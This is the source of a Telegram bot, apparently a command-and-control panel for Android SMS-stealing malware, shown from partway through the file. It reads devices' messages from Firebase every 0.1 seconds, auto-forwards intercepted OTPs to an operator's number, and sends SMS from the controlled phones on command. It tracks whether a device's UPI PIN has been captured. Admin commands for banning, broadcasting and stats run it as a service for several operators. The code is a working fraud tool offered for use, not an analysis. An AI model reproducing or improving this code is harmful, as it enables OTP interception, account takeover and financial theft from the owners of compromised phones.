bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) {
        user.monitorActive = false;
        if (user.monitorInterval) {
            clearInterval(user.monitorInterval);
            user.monitorInterval = null;
        }
        userData.set(userId, user);
    }
    await ctx.reply(`⏸ *Monitor Paused*\n\nUse \`/resume\` to start again.`, { parse_mode: 'Markdown' });
});

bot.command('resume', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    
    user.monitorActive = true;
    user.processedMsgs = new Set();
    user.lastMessageCheck = Date.now();
    
    // Restart monitoring interval
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    user.monitorInterval = setInterval(async () => {
        const currentUser = userData.get(userId);
        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
            await monitorFirebaseMessages(userId, currentUser);
        }
    }, 100); // 100ms = 0.1 seconds
    
    userData.set(userId, user);
    await ctx.reply(`✅ *Monitor Resumed!*\n\n🔄 Real-time monitoring active every 0.1 seconds.`, { parse_mode: 'Markdown' });
});

bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user) return ctx.reply('❌ Not configured.', { parse_mode: 'Markdown' });
    
    const allDevices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    let deviceStatus = 'Unknown';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) {
            deviceInfo = d.name;
            deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE';
        }
    }
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `━━━━━━━━━━━━━━━━━━━\n` +
        `📡 Firebase: ✅ Connected\n` +
        `📱 Device: ${deviceInfo}\n` +
        `📡 Status: ${deviceStatus}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🖥 Total Devices: ${allDevices.length}\n` +
        `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
        `🔄 Refresh Rate: 0.1 seconds\n` +
        `━━━━━━━━━━━━━━━━━━━`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('send', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
    if (args.length < 3) return ctx.reply('❌ Usage: `/send <number> <message>`', { parse_mode: 'Markdown' });
    
    const phone = args[1];
    const message = args.slice(2).join(' ');
    
    const msg = await ctx.reply(`📤 Sending to \`${phone}\`...`, { parse_mode: 'Markdown' });
    const result = await sendSms(userId, user.monitoringDevice, phone, message);
    
    await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        result.success ? `✅ Sent! (${result.elapsed}ms)` : `❌ Failed: ${result.error}`
    );
});

// ==================== ADMIN COMMANDS ====================
bot.command('admin', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    await ctx.reply(
        `👑 *ADMIN PANEL*\n\n` +
        `📊 Total Users: ${userData.size}\n` +
        `🟢 Active: ${Array.from(userData.values()).filter(u => u.monitorActive).length}\n\n` +
        `📌 Commands:\n` +
        `/users - List all users\n` +
        `/ban <id> - Ban user\n` +
        `/unban <id> - Unban user\n` +
        `/broadcast - Send to all\n` +
        `/stats - Detailed stats`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('users', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    if (userData.size === 0) return ctx.reply('📭 No users found.');
    
    let userList = '👥 *USERS*\n\n━━━━━━━━━━━━━━━━━━━\n';
    let index = 1;
    for (const [uid, user] of userData.entries()) {
        const status = user.banned ? '🔴 BANNED' : (user.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
        userList += `${index}. \`${uid}\` ${status}\n`;
        if (user.otpForwardNumber) userList += `   🔐 OTP: ${user.otpForwardNumber}\n`;
        index++;
        if (index > 20) break;
    }
    await ctx.reply(userList, { parse_mode: 'Markdown' });
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/ban <user_id>`', { parse_mode: 'Markdown' });
    
    const targetId = args[1];
    if (!userData.has(targetId)) return ctx.reply(`❌ User not found.`, { parse_mode: 'Markdown' });
    
    const user = userData.get(targetId);
    user.banned = true;
    user.monitorActive = false;
    if (user.monitorInterval) {
        clearInterval(user.monitorInterval);
        user.monitorInterval = null;
    }
    userData.set(targetId, user);
    
    await ctx.reply(`✅ User \`${targetId}\` banned!`, { parse_mode: 'Markdown' });
});

bot.command('unban', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/unban <user_id>`', { parse_mode: 'Markdown' });
    
    const targetId = args[1];
    if (!userData.has(targetId)) return ctx.reply(`❌ User not found.`, { parse_mode: 'Markdown' });
    
    const user = userData.get(targetId);
    user.banned = false;
    userData.set(targetId, user);
    
    await ctx.reply(`✅ User \`${targetId}\` unbanned!`, { parse_mode: 'Markdown' });
});

bot.command('broadcast', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/broadcast <message>`', { parse_mode: 'Markdown' });
    
    const message = args.slice(1).join(' ');
    const msg = await ctx.reply(`📢 Broadcasting...`);
    
    let success = 0, failed = 0;
    for (const [uid, user] of userData.entries()) {
        if (user.banned) continue;
        try {
            await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
            success++;
        } catch(e) { failed++; }
        await new Promise(r => setTimeout(r, 50));
    }
    
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `✅ Sent: ${success} | ❌ Failed: ${failed}`);
});

bot.command('stats', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!', { parse_mode: 'Markdown' });
    
    let totalChannels = 0, activeUsers = 0, bannedUsers = 0, otpForwardUsers = 0;
    for (const [uid, user] of userData.entries()) {
        if (user.banned) bannedUsers++;
        else if (user.monitorActive) activeUsers++;
        if (user.channels) totalChannels += user.channels.length;
        if (user.otpForwardNumber) otpForwardUsers++;
    }
    
    await ctx.reply(
        `📊 *STATS*\n\n` +
        `👥 Users: ${userData.size}\n` +
        `🟢 Active: ${activeUsers}\n` +
        `🔴 Banned: ${bannedUsers}\n` +
        `📢 Chats: ${totalChannels}\n` +
        `🔐 OTP Forward: ${otpForwardUsers}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('help', async (ctx) => {
    await ctx.reply(
        `⚡ *COMMANDS*\n\n` +
        `🔧 *SETUP:*\n` +
        `/setfirebase <url>\n` +
        `/setdevice\n` +
        `/addchannel\n` +
        `/startmonitor\n\n` +
        `🔐 *OTP AUTO-FORWARD:*\n` +
        `/setotpnum <number> - Set OTP forward number\n` +
        `/removeotpnum - Remove OTP forward number\n` +
        `/showotpnum - Show current OTP number\n\n` +
        `📌 *TOKEN FORWARD:*\n` +
        `Send message in channel:\n` +
        `To: 919876543210\n` +
        `Message: Your token here\n\n` +
        `⚙️ *CONTROL:*\n` +
        `/stop / /resume\n` +
        `/status\n` +
        `/send <num> <msg>\n` +
        `/id`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('id', async (ctx) => {
    await ctx.reply(`🆔 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
});

// ==================== CALLBACK HANDLERS ====================
bot.action(/^select_dev_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const deviceId = ctx.match[1];
    
    const device = await getDevice(userId, deviceId);
    if (!device) {
        await ctx.editMessageText('❌ Device not found');
        return;
    }
    
    const user = userData.get(userId);
    user.monitoringDevice = deviceId;
    user.deviceList = null;
    user.lastMessageCheck = 0;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    await ctx.editMessageText(
        `✅ *Device Set!*\n\n` +
        `📱 Name: ${device.name}\n` +
        `🆔 ID: \`${device.id}\`\n` +
        `📞 Phone: ${device.phone}\n` +
        `🔋 Battery: ${device.battery}\n` +
        `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
        `🔐 UPI PIN: ${device.upipin ? '✅ Set' : '❌ Not Set'}\n\n` +
        `Next: \`/addchannel\` or \`/setotpnum\``,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/^dev_page_(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const page = parseInt(ctx.match[1]);
    await showDevicePage(ctx, userId, page);
});

bot.action('cancel_select', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) user.deviceList = null;
    await ctx.editMessageText('❌ Cancelled.');
});

// ==================== MESSAGE HANDLERS FOR CHANNEL/GROUP ====================
bot.on('channel_post', async (ctx) => {
    await handleChannelMessage(ctx, ctx.channelPost);
});

bot.on('message', async (ctx) => {
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        await handleChannelMessage(ctx, ctx.message);
    }
});

async function handleChannelMessage(ctx, messageObj) {
    const chatId = ctx.chat.id.toString();
    const text = messageObj.text || messageObj.caption || '';
    const msgTime = messageObj.date * 1000;
    
    if (!text || text.trim().length === 0) return;
    
    const monitoringUsers = [];
    for (const [uid, u] of userData.entries()) {
        if (u.banned) continue;
        if (u.channels && u.channels.includes(chatId)) {
            monitoringUsers.push({ userId: uid, user: u });
        }
    }
    
    if (monitoringUsers.length === 0) return;
    
    for (const { userId, user } of monitoringUsers) {
        if (!user.monitorActive) continue;
        
        const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
        if (msgTime < startTime) continue;
        
        const msgId = `${chatId}_${messageObj.message_id}`;
        if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
        
        if (!user.processedMsgs) user.processedMsgs = new Set();
        user.processedMsgs.add(msgId);
        userData.set(userId, user);
        
        // Check for Token format (To: X Message: Y)
        const extracted = extractToken(text);
        if (extracted && user.monitoringDevice) {
            console.log(`🎯 Token detected for user ${userId}`);
            console.log(`📞 Target: ${extracted.number}`);
            console.log(`🔐 Token: ${extracted.message.slice(0, 50)}`);
            
            await bot.telegram.sendMessage(
                userId,
                `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${extracted.number}\`\n🔐 Token: \`${extracted.message.slice(0, 100)}\`\n🔄 Forwarding as SMS...`,
                { parse_mode: 'Markdown' }
            );
            
            const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
            
            if (result.success) {
                await bot.telegram.sendMessage(
                    userId,
                    `✅ *TOKEN FORWARDED!*\n\n📞 To: \`${extracted.number}\`\n⏱ ${result.elapsed}ms`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await bot.telegram.sendMessage(
                    userId,
                    `❌ *TOKEN FORWARD FAILED!*\n\n📞 To: \`${extracted.number}\`\n❌ Error: ${result.error}`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    }
}

// ==================== PRIVATE MESSAGE ====================
bot.on('text', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    const userId = ctx.from.id.toString();
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const user = userData.get(userId);
    if (!user) return;
    if (user.banned) return ctx.reply('🔴 BANNED', { parse_mode: 'Markdown' });
    if (!user.monitoringDevice) return;
    
    const extracted = extractToken(text);
    if (!extracted) return;
    
    await ctx.reply(`📤 Sending token to ${extracted.number}...`);
    const result = await sendSms(userId, user.monitoringDevice, extracted.number, extracted.message);
    
    if (result.success) {
        await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
    } else {
        await ctx.reply(`❌ Failed: ${result.error}`);
    }
});

// ==================== START ====================
async function main() {
    console.log('\n🚀 ========== SOUL EXE AUTO VERIFICATION v2.0 ==========');
    console.log('✅ REAL-TIME MONITORING: 0.1 SECOND INTERVAL');
    console.log('✅ OTP AUTO-FORWARD FROM FIREBASE');
    console.log('✅ TOKEN FORWARD FEATURE');
    console.log('==========================================\n');
    
    bot.launch();
    console.log('🤖 Bot running...\n');
    console.log('📌 REAL-TIME MONITORING:');
    console.log('   Checking Firebase every 0.1 seconds for new messages');
    console.log('   OTPs auto-forward to your set number instantly');
    console.log('==========================================\n');
}

main();
